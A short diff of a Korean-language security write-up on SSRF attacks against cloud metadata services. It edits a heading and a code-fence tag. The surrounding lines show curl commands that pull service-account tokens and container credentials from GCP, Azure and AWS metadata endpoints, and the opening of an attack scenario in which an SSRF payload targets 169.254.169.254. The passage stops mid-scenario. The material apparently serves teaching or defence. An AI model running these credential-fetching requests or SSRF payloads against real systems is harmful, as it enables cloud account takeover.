@@ -40,14 +40,14 @@ curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accoun
 curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
   -H "Metadata: true"
 
-# AWS EKS (Kubernetes Pod 환경)
+# AWS ECS (컨테이너 태스크 역할)
 curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
 # 또는 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
 ```
 
 ## 실제 공격 시나리오
 
-```
+```text
 1. 공격자: 취약한 URL Fetch API 발견
    GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    응답: ec2-ssrf-demo-role
